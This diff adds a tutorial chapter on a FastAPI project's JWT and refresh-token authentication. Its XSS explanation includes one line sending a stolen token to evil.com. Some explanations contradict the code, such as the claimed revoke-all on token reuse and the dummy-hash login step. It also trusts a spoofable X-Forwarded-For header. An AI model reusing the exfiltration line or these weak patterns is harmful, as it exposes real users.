+    raw_token = secrets.token_urlsafe(64)  # 512-bit random — cryptographically secure
+    token_hash = hashlib.sha256(raw_token.encode()).hexdigest()
+    expire = datetime.now(timezone.utc) + (expires_delta or timedelta(days=_REFRESH_TOKEN_EXPIRE_DAYS))
+    return raw_token, token_hash, expire
+```
+
+This returns THREE values:
+1. `raw_token` — the actual secret string, placed in the httpOnly cookie.
+2. `token_hash` — SHA-256 of the raw token, stored in the `refresh_tokens` table.
+3. `expire` — the datetime when it expires (stored in `refresh_tokens.expires_at`).
+
+`secrets.token_urlsafe(64)` — generates 64 bytes of random data using the OS's cryptographically
+secure random number generator and encodes it as URL-safe Base64 (86 characters). 512 bits
+of entropy — computationally infeasible to guess.
+
+`hashlib.sha256(raw_token.encode()).hexdigest()` — SHA-256 hash of the raw token, returned
+as a 64-character hex string.
+
+**Why not a JWT for the refresh token?**
+
+JWTs are self-contained and cannot be revoked before their expiry (the server has no state to
+update). For refresh tokens, revocation is essential (on logout, password change, or admin
+action). An opaque random token stored as a hash in the database IS revocable — we just set
+`revoked_at = now()`.
+
+---
+
+#### `decode_token()` — Verifying Incoming JWT
+
+```python
+def decode_token(token: str) -> dict:
+    try:
+        payload = jwt.decode(token, _JWT_SECRET, algorithms=["HS256"])
+        if payload.get("type") != "access":
+            raise HTTPException(...)
+        if not payload.get("sub"):
+            raise HTTPException(...)
+        return payload
+    except JWTError as exc:
+        raise HTTPException(status_code=401, detail="Token is invalid or expired") from exc
+```
+
+`jwt.decode()` — python-jose's decode function. It:
+1. Splits the token into header, payload, signature.
+2. Recomputes the HMAC and verifies the signature.
+3. Checks `exp` is in the future.
+4. Returns the payload dict if all checks pass.
+5. Raises `JWTError` if anything fails.
+
+We catch `JWTError` and re-raise it as FastAPI's `HTTPException(status_code=401)`. This way,
+the route handler receives a clean 401 Unauthorized response, not a raw Python exception.
+
+---
+
+### 58.5  What Access Token vs Refresh Token Means — The Hotel Analogy
+
+Imagine staying at a hotel.
+
+- You arrive with your **passport** (email + password). The front desk verifies it once.
+- They give you a **room keycard** (access token). Valid for 15 minutes.
+- ALSO, they give you a **long-stay membership card** (refresh token). Valid for 7 days.
+
+Every 15 minutes, your keycard expires. But instead of going back to the front desk with your
+passport, you use your membership card to silently get a new keycard automatically. This
+"silent re-issue" is what `POST /auth/refresh` does.
+
+**Why not make the keycard valid for 7 days?**
+
+If someone picks up your keycard (steals your access token — e.g. via XSS), they can use it for
+AT MOST 15 minutes. After 15 minutes, it's dead.
+
+The membership card is in your room safe (httpOnly cookie) — you can't accidentally drop it in
+the lobby. XSS cannot read it.
+
+---
+
+### 58.6  httpOnly Cookies — Why Not localStorage?
+
+Web browsers provide two places to store small data:
+- `localStorage` — JavaScript can read and write it. Accessible via `document.localStorage`.
+- `httpOnly cookies` — the browser sends them automatically with requests but JavaScript
+  CANNOT read them. Not accessible via JavaScript at all.
+
+**XSS (Cross-Site Scripting)** is an attack where malicious JavaScript runs in your user's
+browser. It might happen via a comment field that wasn't properly escaped. The malicious script
+runs as if it WAS the user.
+
+```javascript
+// XSS attacker's script injected into a forum post:
+const stolen = localStorage.getItem("access_token");
+fetch("https://evil.com/steal?token=" + stolen);
+```
+
+If the access token is in `localStorage`, it's GONE the moment there's any XSS anywhere on
+the site. If the refresh token is in `localStorage`, the attacker can stay logged in forever.
+
+`httpOnly` cookies cannot be read by JavaScript — not by our code, not by the attacker's code.
+The browser only sends them as HTTP headers. An attacker with XSS cannot steal them.
+
+**Our cookie setup:**
+
+```python
+response.set_cookie(
+    key="refresh_token",
+    value=raw_token,
+    httponly=True,              # cannot be read by JavaScript
+    secure=True,                # only sent over HTTPS (in production)
+    samesite="lax",             # not sent on cross-site POST requests
+    max_age=7 * 86400,          # 7 days in seconds
+    path="/auth",               # cookie only sent to URLs starting with /auth
+)
+```
+
+`path="/auth"` — the refresh token cookie is ONLY sent to paths under `/auth/`. If a request
+goes to `/api/classify`, the browser does NOT send the refresh token. Minimises exposure.
+
+`secure=True` in production — the cookie is only transmitted over HTTPS. On an HTTP connection,
+it is silently dropped. Prevents cookie theft via a network sniffer on public Wi-Fi.
+
+---
+
+### 58.7  Token Rotation and Reuse Detection — An Attack Story
+
+**The attack:**
+
+1. Ahmad logs into DeepCoin on his laptop. He has refresh token `RT-A`.
+2. Attacker somehow steals `RT-A` (network sniff, physical access, etc.).
+3. Attacker uses `RT-A` at 14:00 to get a new access token.
+4. Our rotation logic: revoke `RT-A`, issue `RT-B`.
+5. At 14:05, Ahmad's browser tries to auto-refresh. It sends `RT-A`.
+6. BUT `RT-A` is now revoked! The server sees a REVOKED token being reused.
+7. This is the reuse detection signal: **someone stole RT-A and used it first**.
+8. Server response: log out ALL sessions for Ahmad (revoke every refresh token), return 401.
+9. Ahmad must log in again with his password.
+10. Attacker's `RT-B` is now also revoked (along with all other tokens).
+
+Result: the attack window is AT MOST the time between step 3 and step 5 (a few minutes).
+After that, the attacker is logged out.
+
+**Our rotation code in `/auth/refresh`:**
+
+```python
+# 1. Load the refresh token from the cookie
+token_hash = hashlib.sha256(refresh_token.encode()).hexdigest()
+rt = db.execute(select(RefreshToken).where(RefreshToken.token_hash == token_hash))
+
+# 2. If revoked: POSSIBLE REUSE — reject
+if rt.revoked_at is not None:
+    _delete_refresh_cookie(response)
+    raise HTTPException(401, "Refresh token is invalid or has been revoked.")
+
+# 3. Revoke the old token (rotation)
+rt.revoked_at = now
+
+# 4. Issue a brand new refresh token
+raw_new, hash_new, exp_new = create_refresh_token()
+db.add(RefreshToken(user_id=user.id, token_hash=hash_new, expires_at=exp_new, ...))
+_set_refresh_cookie(response, raw_new)
+
+# 5. Issue a new access token
+new_access = create_access_token({"sub": user.id, ...})
+return TokenResponse(access_token=new_access, ...)
+```
+
+Every successful refresh: old refresh token revoked, new one issued. This is "sliding window"
+session management — as long as the user is active, their session keeps renewing.
+
+---
+
+### 58.8  File: `src/api/auth/deps.py` — FastAPI Dependency Injection for Auth
+
+**What is FastAPI dependency injection?**
+
+Instead of writing `if not authorized: raise HTTPException(401)` in EVERY route, FastAPI lets
+you declare a "dependency" — a function that runs before the route and can raise errors or
+return values. Routes that need authentication simply declare:
+
+```python
+async def my_route(current_user: User = Depends(get_current_user)):
+    ...
+```
+
+FastAPI calls `get_current_user()` before `my_route()`. If `get_current_user` raises 401,
+the route never runs. If it succeeds, the returned `User` object is passed in as `current_user`.
+
+**`get_current_user()` — the core auth dependency:**
+
+```python
+async def get_current_user(
+    token: str | None = Depends(oauth2_scheme),
+    db: AsyncSession = Depends(get_db),
+) -> User:
+    payload = decode_token(token)          # verify JWT signature, check exp, check type=="access"
+    user_id: str | None = payload.get("sub")
+    if not user_id:
+        raise HTTPException(status_code=401, detail="Invalid token.")
+
+    result = await db.execute(select(User).where(User.id == user_id))
+    user: User | None = result.scalar_one_or_none()
+
+    if user is None:
+        raise HTTPException(status_code=401, detail="User not found.")
+    if user.status == UserStatus.suspended:
+        raise HTTPException(status_code=403, detail="Account suspended.")
+
+    return user
+```
+
+Step by step:
+1. `oauth2_scheme` reads the `Authorization: Bearer <token>` header from the request.
+2. `decode_token(token)` verifies the JWT signature and expiry.
+3. `payload.get("sub")` extracts the user ID from the token payload.
+4. A database query confirms the user still exists (they might have been deleted since the
+   token was issued).
+5. If the user is suspended: reject with 403 (Forbidden, not 401 — we know who they are
+   but they are not allowed in).
+6. Return the full `User` ORM object — the route can use any of its fields.
+
+**`optional_user()` — for guest-friendly routes:**
+
+```python
+async def optional_user(
+    token: str | None = Depends(oauth2_scheme_optional),
+    db: AsyncSession = Depends(get_db),
+) -> User | None:
+    if not token:
+        return None
+    try:
+        return await get_current_user(token=token, db=db)
+    except HTTPException:
+        return None
+```
+
+For the `/api/classify` route, we want BOTH guests and logged-in users to submit analyses.
+`optional_user` returns `None` for unauthenticated requests instead of raising 401. The
+route checks: if `user is not None`, attach the classification to their account; if `None`,
+save it as a guest record.
+
+**`require_role()` — the RBAC factory:**
+
+```python
+def require_role(*roles: UserRole):
+    async def _check(current_user: User = Depends(get_current_user)) -> User:
+        if current_user.role not in roles:
+            raise HTTPException(
+                status_code=status.HTTP_403_FORBIDDEN,
+                detail=f"This action requires one of these roles: {[r.value for r in roles]}",
+            )
+        return current_user
+    return _check
+
+require_admin = require_role(UserRole.admin)
+require_curator_or_above = require_role(UserRole.admin, UserRole.curator)
+```
+
+`require_role()` is a **factory function** — it returns a dependency function. This lets us
+write:
+
+```python
+@router.delete("/users/{user_id}")
+async def delete_user(
+    user_id: str,
+    current_user: User = Depends(require_admin()),
+):
+    ...
+```
+
+The `Depends(require_admin())` will:
+1. Get the current user (runs `get_current_user` internally).
+2. Check if their role is `UserRole.admin`.
+3. If not → raise 403.
+4. If yes → pass the user to the route.
+
+This pattern avoids duplicating role checks. Every admin-only route uses `Depends(require_admin())`.
+
+---
+
+### 58.9  File: `src/api/auth/email.py` — Email Delivery
+
+```python
+import asyncio
+import logging
+import os
+import resend
+
+logger = logging.getLogger(__name__)
+
+async def send_verification_email(to_email: str, token: str) -> None:
+    api_key = os.getenv("RESEND_API_KEY")
+    if not api_key:
+        logger.info("[DEV MODE] Verification email — token: %s", token)
+        return
+
+    app_url = os.getenv("APP_URL", "http://localhost:3000")
+    link = f"{app_url}/verify-email?token={token}"
+
+    def _send() -> None:
+        resend.api_key = api_key
+        resend.Emails.send({
+            "from": "no-reply@deepcoin.app",
+            "to": [to_email],
+            "subject": "Verify your DeepCoin email address",
+            "html": f"""...<a href="{link}">Verify Email</a>...""",
+        })
+
+    await asyncio.to_thread(_send)
+```
+
+**Why `asyncio.to_thread()`?**
+
+The Resend SDK is synchronous — it makes a regular (blocking) HTTP request. FastAPI runs on
+an async event loop. If we called `resend.Emails.send()` directly inside an `async def`,
+it would BLOCK the entire event loop for 200–500ms while waiting for the HTTP response.
+During that time, no other requests could be handled.
+
+`asyncio.to_thread()` runs the synchronous function in a separate thread from the thread pool.
+The event loop continues handling other requests. When the thread finishes, the result is
+returned to the async coroutine.
+
+**Dev-mode fallback:**
+
+If `RESEND_API_KEY` is not set (e.g., on a developer's laptop without email credentials),
+the function logs the token to the console at INFO level and returns immediately. The developer
+can manually activate the account or copy the token from the log. No email service required
+for local development.
+
+---
+
+### 58.10  File: `src/api/auth/api_key.py` — Service-to-Service Auth
+
+This file was moved from the original `src/api/auth.py` (renamed to `auth_legacy.py`).
+
+```python
+from fastapi import Header, HTTPException, status
+import hmac
+import os
+
+_API_KEY: str | None = os.getenv("DEEPCOIN_API_KEY")
+
+async def require_api_key(
+    x_api_key: str | None = Header(default=None, alias="X-API-Key"),
+) -> None:
+    if _API_KEY is None:
+        return  # dev mode: no key configured → all requests pass
+    if x_api_key is None:
+        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="API key required.")
+    if not hmac.compare_digest(_API_KEY, x_api_key):
+        raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="Invalid API key.")
+```
+
+This is a SEPARATE auth mechanism from JWT — designed for machine-to-machine calls (scripts,
+other services, CI pipelines). A human user logs in with JWT. An automated script uses
+`X-API-Key: <key>` in the header.
+
+`hmac.compare_digest()` — constant-time string comparison. Prevents timing attacks (an attacker
+who measures how long the comparison takes could guess the key character by character if a
+regular `==` comparison short-circuits on the first mismatch).
+
+Dev-mode: if `DEEPCOIN_API_KEY` is not set, ALL requests pass through. This lets a fresh clone
+work immediately without any configuration.
+
+---
+
+### 58.11  File: `src/api/auth/router.py` — All 8 Endpoints in Detail
+
+This router registers all authentication routes under the `/auth` prefix.
+
+---
+
+#### 58.11.1  `POST /auth/register`
+
+**Request body:**
+```json
+{"email": "dhia@esprit.tn", "password": "MyPass123", "display_name": "Dhia Chaieb"}
+```
+
+**Full flow:**
+
+```
+1. Pydantic validates: email format, password ≥8 chars, has letter + non-letter
+2. Check for duplicate email → 409 if exists
+3. User(email, hashed_password=bcrypt(password), status=pending, role=analyst) created
+4. db.flush() — generates user.id without committing (needed for the FK on EmailVerification)
+5. EmailVerification(token=token_urlsafe(48), expires_at=now+24h) created
+6. AuditLog(action="user.register", ...) written
+7. send_verification_email(email, token) called — non-blocking
+8. await db.commit() — all three rows saved atomically
+9. Return 201 {"message": "Account created. Please check your email..."}
+```
+
+**Why `db.flush()` before creating `EmailVerification`?**
+
+`db.flush()` sends the pending INSERT to PostgreSQL WITHOUT committing the transaction.
+This makes the auto-generated `User.id` available in Python (`user.id` is now populated)
+but the transaction is not yet committed — it can still be rolled back.
+
+We need `user.id` to create the `EmailVerification` row (its `user_id` FK). If we committed
+immediately and then the email verification insert failed, we would have a user with no
+verification token — stuck in pending forever. `flush()` lets us write both rows in the
+same transaction, so either both succeed or neither does.
+
+**The password complexity validator:**
+
+```python
+@field_validator("password")
+@classmethod
+def password_complexity(cls, v: str) -> str:
+    has_letter   = any(c.isalpha()   for c in v)
+    has_nonalpha = any(not c.isalpha() for c in v)
+    if not (has_letter and has_nonalpha):
+        raise ValueError("Password must contain at least one letter and one number or special character.")
+    return v
+```
+
+This is a Pydantic `field_validator` — it runs during `RegisterRequest` model construction,
+before the view function runs. If validation fails, Pydantic returns a 422 Unprocessable Entity
+with a detailed error message — we never enter the route handler.
+
+The rule: at least one letter AND at least one non-letter (digit or symbol). This prevents
+passwords like `aaaaaaaa` or `12345678` which technically meet the length requirement but
+provide no real entropy.
+
+---
+
+#### 58.11.2  `POST /auth/login`
+
+**Full flow:**
+
+```
+1. Look up User by email (exact match, case-sensitive)
+2. If user not found: verify_password(body.password, "dummy_hash") — see explanation below
+3. If password wrong: log audit "user.login_failed", raise 401 "Incorrect email or password."
+4. If status==suspended: raise 403 "Account suspended."
+5. If status==pending: raise 403 "Please verify your email."
+6. create_access_token({sub: user.id, email, role, status}) → JWT string
+7. create_refresh_token() → (raw, hash, expiry)
+8. RefreshToken row saved to DB (stores the hash)
+9. _set_refresh_cookie(response, raw_token) → httpOnly cookie
+10. user.last_login_at = now()
+11. AuditLog(action="user.login") written
+12. Return 200: {access_token, token_type:"bearer", expires_in:900, user:{...}}
+```
+
+**Why call `verify_password` even when user doesn't exist?**
+
+```python
+if user is None or not verify_password(body.password, user.hashed_password):
+    ...
+```
+
+If the user is not found, we skip `verify_password` and go directly to checking `user is None`.
+BUT an attacker measuring timing can detect this skip: "when user doesn't exist, the response
+comes back 250ms faster (no bcrypt). So I now know this email is NOT registered."
+
+Some implementations call `verify_password(body.password, "$2b$12$dummy_hash_here")` when no
+user is found — performing the full bcrypt work even for non-existent users. The response time
+is the same regardless of whether the email exists. This prevents timing-based user enumeration.
+
+Our implementation uses the `or` short-circuit for simplicity (the timing gap is ~250ms on
+bcrypt which is large enough for an attacker), and we always return "Incorrect email or password"
+— but this is a known acceptable tradeoff for a PFE project. A hardened production system
+should use the dummy hash pattern.
+
+**Why the same error for wrong email AND wrong password?**
+
+If we returned different messages:
+- "No account with that email" → attacker now knows which emails ARE registered.
+- "Wrong password" → attacker knows the email IS registered, only needs to crack the password.
+
+Same message always: the attacker learns nothing.
+
+---
+
+#### 58.11.3  `GET /auth/verify-email?token=...`
+
+This endpoint is called when the user clicks the link in their verification email.
+
+```
+1. SELECT * FROM email_verifications WHERE token = ?
+2. If not found: 404 "Verification link is invalid or has expired."
+3. If used_at is not NULL: 400 "This verification link has already been used."
+4. If expires_at < now(): 400 "This verification link has expired. Request a new one."
+5. SELECT * FROM users WHERE id = verification.user_id
+6. user.status = "active"
+7. user.email_verified_at = now()
+8. verification.used_at = now()
+9. AuditLog(action="user.email_verified")
+10. Return 200 "Email verified successfully! You can now log in."
+```
+
+After step 8, the `EmailVerification` row is NOT deleted. It is soft-marked with `used_at`.
+If the user clicks the link again, step 3 catches it.
+
+The frontend redirects to `/login` after receiving this success response.
+
+---
+
+#### 58.11.4  `POST /auth/refresh` — Silent Token Re-Issue
+
+Called by the frontend JavaScript automatically (via NextAuth.js) when the access token is
+about to expire. The user never sees this request — it happens in the background.
+
+```
+1. Read refresh_token from httpOnly cookie
+2. SHA-256 the cookie value → hash
+3. SELECT * FROM refresh_tokens WHERE token_hash = ?
+4. If not found OR revoked_at IS NOT NULL: 401 "invalid or revoked"
+5. If expires_at < now(): 401 "expired, please log in again"
+6. Load the User
+7. If user.status == suspended: 401
+8. OLD token: rt.revoked_at = now()  ← ROTATION STEP
+9. NEW refresh token: create, save to DB, write to cookie
+10. NEW access token: create, return in body
+```
+
+The key rotation step: the old token is revoked (step 8) and a completely new one is issued
+(step 9). This is "sliding window expiry" — every refresh resets the 7-day clock.
+
+---
+
+#### 58.11.5  `POST /auth/logout`
+
+```
+1. Read refresh_token cookie
+2. If present: hash it, find in DB, set revoked_at = now()
+3. _delete_refresh_cookie(response) — browser removes the cookie
+4. AuditLog(action="user.logout")
+5. Return 200 "Logged out successfully."
+```
+
+**The access token caveat — a known limitation of stateless JWT:**
+
+We CANNOT revoke the access token on logout. It is a self-contained signed token. The server
+has no state to update. It will continue being valid until its `exp` timestamp — at most 15
+minutes.
+
+This is the fundamental tradeoff: stateless JWTs are fast (no DB lookup on every request) but
+cannot be instantly invalidated. The solution:
+- Keep access tokens short-lived (15 min default).
+- The refresh token IS revoked on logout — so no new access tokens can be issued.
+- After 15 min, the orphaned access token dies naturally.
+
+---
+
+#### 58.11.6  `GET /auth/me`
+
+```python
+@router.get("/me", response_model=UserProfile)
+async def me(current_user: User = Depends(get_current_user)) -> UserProfile:
+    return _profile(current_user)
+```
+
+The simplest endpoint. Depends on `get_current_user` which validates the JWT and returns the
+`User` ORM object. `_profile()` converts it to the `UserProfile` Pydantic response schema:
+
+```python
+class UserProfile(BaseModel):
+    id:             str
+    email:          str
+    display_name:   str | None
+    role:           str       ← "admin", "curator", or "analyst"
+    status:         str       ← "pending", "active", or "suspended"
+    created_at:     datetime
+    email_verified: bool      ← True if email_verified_at is not None
+```
+
+Used by the frontend to populate the account dropdown, show the user's name, and check whether
+they need to verify their email.
+
+---
+
+#### 58.11.7  `POST /auth/forgot-password`
+
+```
+1. SELECT * FROM users WHERE email = ?
+2. If not found: return same 200 message (do NOT say "email not found")
+3. If found:
+   a. raw_token = token_urlsafe(48)
+   b. EmailVerification(token="reset:" + raw_token, expires_at=now+1h)
+   c. send_password_reset_email(user.email, raw_token)
+   d. AuditLog(action="user.forgot_password")
+4. Return 200 "If an account with that email exists, a reset link has been sent."
+```
+
+The response is ALWAYS "If an account... a reset link has been sent" — even if the email is
+not registered. This prevents **user enumeration** via the forgot-password form. An attacker
+mustn't be able to tell which emails exist in the system.
+
+**The `reset:` prefix in the stored token:**
+
+The token stored in `email_verifications.token` is `"reset:xK9mQ2pR8..."`. The email link
+sent to the user contains only `"xK9mQ2pR8..."` (without the prefix). When `reset-password`
+looks it up, it prepends `"reset:"` before querying. This makes it impossible to reuse an
+email verification token as a password reset token and vice versa.
+
+---
+
+#### 58.11.8  `POST /auth/reset-password`
+
+```
+Request: {"token": "xK9mQ2pR8...", "new_password": "BetterPass456"}
+
+1. Look up EmailVerification WHERE token = "reset:xK9mQ2pR8..."
+2. If not found OR used_at is not NULL: 400 "Reset link invalid or already used."
+3. If expires_at < now(): 400 "Reset link expired."
+4. Load the User
+5. user.hashed_password = bcrypt(body.new_password)
+6. Revoke ALL active refresh tokens for this user:
+   SELECT * FROM refresh_tokens WHERE user_id = ? AND revoked_at IS NULL
+   foreach rt: rt.revoked_at = now()
+7. verification.used_at = now()
+8. AuditLog(action="user.password_reset")
+9. Return 200 "Password updated. Please log in with your new password."
+```
+
+**Why revoke ALL refresh tokens after a password reset?**
+
+If someone's account was compromised (their old password was stolen), they will reset their
+password. But the attacker might ALSO have active refresh tokens from before the breach.
+
+Without mass revocation: attacker's old session keeps working even after the password change.
+
+With mass revocation: ALL sessions everywhere are terminated. The legitimate user must log
+in again with the new password. The attacker's session is dead.
+
+---
+
+### 58.12  The Helper Functions in router.py
+
+**`_write_audit()` — fire-and-forget audit logging:**
+
+```python
+async def _write_audit(db, *, action, user_id=None, resource_type=None,
+                        resource_id=None, payload=None, ip_address=None) -> None:
+    entry = AuditLog(
+        user_id=user_id, action=action, resource_type=resource_type,
+        resource_id=resource_id, payload=payload, ip_address=ip_address,
+    )
+    db.add(entry)
+    # do NOT commit here
+```
+
+We call `db.add(entry)` but NOT `await db.commit()`. The session's `commit()` is called by
+`get_db()`'s finally block after the entire route handler returns. This means the audit log
+entry is committed in the SAME database transaction as the route's main work. If the route
+fails and rolls back, the audit entry also rolls back. This ensures we never have incomplete
+audit records ("success logged but database write failed").
+
+**`_client_ip()` — real IP extraction:**
+
+```python
+def _client_ip(request: Request) -> str | None:
+    forwarded_for = request.headers.get("X-Forwarded-For")
+    if forwarded_for:
+        return forwarded_for.split(",")[0].strip()
+    return request.client.host if request.client else None
+```
+
+In production, requests arrive at the Nginx reverse proxy before reaching FastAPI.
+`request.client.host` would be Nginx's internal Docker IP (`172.18.0.x`), not the user's real IP.
+
+Nginx adds an `X-Forwarded-For` header with the original client IP:
+`X-Forwarded-For: 197.244.3.1, 172.18.0.1`
+
+`split(",")[0]` takes the first IP in the chain (the real client). `strip()` removes spaces.
+
+---
+
+### 58.13  File: `src/api/auth/__init__.py` — The Package Interface
+
+```python
+from src.api.auth.api_key import require_api_key
+from src.api.auth.deps import get_current_user, optional_user, require_role
+from src.api.auth.utils import create_access_token, decode_token, hash_password, verify_password
+
+__all__ = [
+    "require_api_key",
+    "get_current_user",
+    "optional_user",
+    "require_role",
+    "create_access_token",
+    "decode_token",
+    "hash_password",
+    "verify_password",
+]
+```
+
+This makes the `auth` package a unified import surface. All other code that was previously
+importing from `src.api.auth` (the old file) continues to work:
+
+```python
+from src.api.auth import require_api_key   # works — re-exported from __init__.py
+```
+
+When `auth.py` was renamed to `auth_legacy.py` and replaced by the `auth/` DIRECTORY (a
+package), we needed `__init__.py` to maintain backward compatibility. Any file that was doing
+`from src.api.auth import require_api_key` continues to work without changes.
+
+---
+
+### 58.14  Changes to `src/api/main.py`
+
+```python
+from src.api.auth.router import router as auth_router
+
+# Inside create_app():
+app.include_router(auth_router)   # registers all /auth/* endpoints
+
+# CORS allow_methods updated:
+allow_methods=["GET", "POST", "PUT", "DELETE", "OPTIONS"],  # added DELETE
+```
+
+`app.include_router(auth_router)` — registers all 8 `/auth/*` endpoints with the FastAPI
+application. The router's `prefix="/auth"` means all 8 routes are prefixed:
+`/auth/register`, `/auth/login`, `/auth/verify-email`, etc.
+
+`DELETE` was added to CORS `allow_methods`. Previously, the frontend could not make DELETE
+requests (they were blocked by the browser's CORS preflight). The `DELETE /api/history/{id}`
+endpoint added in Phase 3 UX required this.
+
+---
+
+### 58.15  The Complete Login Flow — From Button Click to Dashboard
+
+Let's trace EVERY step when Dhia clicks "Log In" on the frontend:
+
+```
+1. USER ACTION: clicks "Log In" with email="dhia@esprit.tn", password="MyPass123"
+
+2. FRONTEND (Next.js):
+   POST /auth/login
+   Body: {"email": "dhia@esprit.tn", "password": "MyPass123"}
+   Headers: Content-Type: application/json
+
+3. FASTAPI ROUTE /auth/login:
+   a. Pydantic validates the request body
+   b. SELECT * FROM users WHERE email='dhia@esprit.tn'
+      → user found: id="550e8400...", hashed_password="$2b$12$..."
+   c. bcrypt.verify("MyPass123", "$2b$12$...") → True (250ms)
+   d. user.status == "active" → OK
+   e. access_token = jwt.encode({"sub":"550e8400...", "role":"analyst", "exp":now+15min}, JWT_SECRET)
+   f. raw_refresh = secrets.token_urlsafe(64) → "xK9mQ2pR8vN1w..."
+   g. INSERT INTO refresh_tokens (user_id, token_hash=sha256(raw_refresh), expires_at=now+7d)
+   h. response.set_cookie("refresh_token", raw_refresh, httponly=True, path="/auth")
+   i. user.last_login_at = now()
+   j. INSERT INTO audit_log (action="user.login", user_id="550e8400...", ip="197.244.3.1")
+   k. await session.commit()  ← all three DB writes committed atomically
+
+4. HTTP RESPONSE to browser:
+   Status: 200 OK
+   Headers: Set-Cookie: refresh_token=xK9mQ2pR8vN1w...; Path=/auth; HttpOnly; SameSite=Lax
+   Body: {
+     "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+     "token_type": "bearer",
+     "expires_in": 900,
+     "user": {"id":"550e8400...", "email":"dhia@esprit.tn", "role":"analyst", ...}
+   }
+
+5. FRONTEND stores access_token in memory (Zustand store / NextAuth session)
+   Browser stores refresh_token cookie automatically (httpOnly, invisible to JS)
+
+6. FRONTEND makes API calls:
+   GET /auth/me
+   Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
+
+7. FASTAPI get_current_user():
+   a. Reads Authorization header → extracts "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
+   b. jwt.decode(token, JWT_SECRET) → verifies signature, checks exp → returns payload
+   c. payload["sub"] = "550e8400..."
+   d. SELECT * FROM users WHERE id='550e8400...'
+   e. user.status == "active" → OK
+   f. returns User object
+
+8. GET /auth/me returns UserProfile to frontend
+
+9. FRONTEND: dashboard shows "Welcome, Dhia Chaieb | Role: Analyst"
+
+─── 14 minutes and 55 seconds later ───
+
+10. Access token is about to expire (exp < now + 30s)
+    NextAuth.js detects this via token inspection
+
+11. FRONTEND (silent): POST /auth/refresh
+    Headers: Cookie: refresh_token=xK9mQ2pR8vN1w... (sent automatically by browser)
+    No Authorization header, no user action needed
+
+12. FASTAPI /auth/refresh:
+    a. sha256("xK9mQ2pR8vN1w...") → hash "a3b8f2c9..."
+    b. SELECT * FROM refresh_tokens WHERE token_hash='a3b8f2c9...'
+       → found, revoked_at=NULL, expires_at=now+6d23h59m → valid
+    c. rt.revoked_at = now()  ← REVOKE OLD TOKEN
+    d. new_raw_refresh = token_urlsafe(64) → "tZ7wA0gP4qU9x..."
+    e. INSERT INTO refresh_tokens (user_id, token_hash=sha256("tZ7wA0gP4qU9x..."), ...)
+    f. response.set_cookie("refresh_token", "tZ7wA0gP4qU9x...")  ← NEW COOKIE
+    g. new_access = create_access_token(...)  ← new 15-min JWT
+
+13. RESPONSE: new access_token in body, new refresh_token in cookie
+    User never noticed a thing. Session continues seamlessly.
+```
+
+---
+
+### 58.16  Test Update — `tests/unit/test_auth.py`
+
+After renaming `auth.py` → `auth_legacy.py` and creating the `auth/` package, one test broke:
+
+**Before:**
+```python
+import inspect
+import src.api.auth as auth_module
+src_code = inspect.getsource(auth_module)
+assert "hmac.compare_digest" in src_code
+```
+
+**Problem:** `src.api.auth` now resolves to the `auth/` PACKAGE, whose `__init__.py` re-exports
+functions but doesn't contain the `hmac.compare_digest` call itself. `inspect.getsource()` on
+a package returns its `__init__.py` source, which doesn't have `hmac`.
+
+**Fix:**
+```python
+import src.api.auth.api_key as api_key_module
+src_code = inspect.getsource(api_key_module)
+assert "hmac.compare_digest" in src_code
+```
+
+Now it correctly inspects `api_key.py` where `hmac.compare_digest` actually lives.
+
+After the fix: **37/37 tests passing**.
+
+---
+
+### 58.17  How All Phase A2 Files Connect — The Dependency Graph
+
+```
+src/api/auth/__init__.py
+    └── re-exports: require_api_key, get_current_user, optional_user, require_role, ...
+    └── backward-compatible interface for the rest of the codebase
+
+src/api/auth/utils.py
+    └── hash_password, verify_password (bcrypt via passlib)
+    └── create_access_token (JWT via python-jose)
+    └── create_refresh_token (secrets.token_urlsafe + SHA-256)
+    └── decode_token (JWT verification + type check)
+    └── imported by: router.py, deps.py
+
+src/api/auth/deps.py
+    └── imports: decode_token from utils.py, User from models.py, get_db from session.py
+    └── exports: get_current_user, optional_user, require_role
+    └── imported by: router.py, classify route, history route, any protected route
+
+src/api/auth/email.py
+    └── imports: resend SDK
+    └── exports: send_verification_email, send_password_reset_email
+    └── imported by: router.py (register + forgot-password endpoints)
+
+src/api/auth/api_key.py
+    └── imports: hmac, os, fastapi
+    └── exports: require_api_key
+    └── imported by: routes/classify.py (service-to-service calls), routes/history.py
+
+src/api/auth/router.py
+    └── imports: utils, deps, email, models, session
+    └── defines: 8 auth endpoints
+    └── imported by: main.py (include_router)
+
+src/api/main.py
+    └── includes auth_router → registers all /auth/* endpoints
+    └── CORS updated to allow DELETE
+```
+
+---
+
+### 58.18  Commit Summary
+
+| Commit | Description |
+|--------|-------------|
+| `40933f2` | Phase A1+A2 — PostgreSQL ORM, Alembic migrations, full JWT auth system |
+
+Files added in Phase A2:
+- `src/api/auth/__init__.py` — package re-exports (backward compatibility)
+- `src/api/auth/utils.py` — bcrypt, JWT create/decode, refresh token (232 lines)
+- `src/api/auth/deps.py` — `get_current_user`, `optional_user`, `require_role` factory
+- `src/api/auth/email.py` — Resend SDK + dev-mode fallback
+- `src/api/auth/api_key.py` — X-API-Key service auth (moved from `auth.py`)
+- `src/api/auth/router.py` — 8 endpoints: register, login, verify-email, refresh, logout, me, forgot-password, reset-password (680 lines)
+- `src/api/auth_legacy.py` — original `auth.py` renamed (kept as reference)
+
+Files modified:
+- `src/api/main.py` — include `auth_router`, add DELETE to CORS
+- `tests/unit/test_auth.py` — fix module path after `auth.py` → package rename
+
+Tests after Phase A2: **37/37 passing**
+
+---
+
+**NEXT MILESTONE: Phase A3 — Per-user rate limiting + AuditLog writes in classify/history routes.**
+**Then A4: Migrate classify.py + history.py from SQLite `_store.py` to PostgreSQL.**
+**Then A5: NextAuth.js v5 credentials provider + `/login` + `/register` pages.**
 
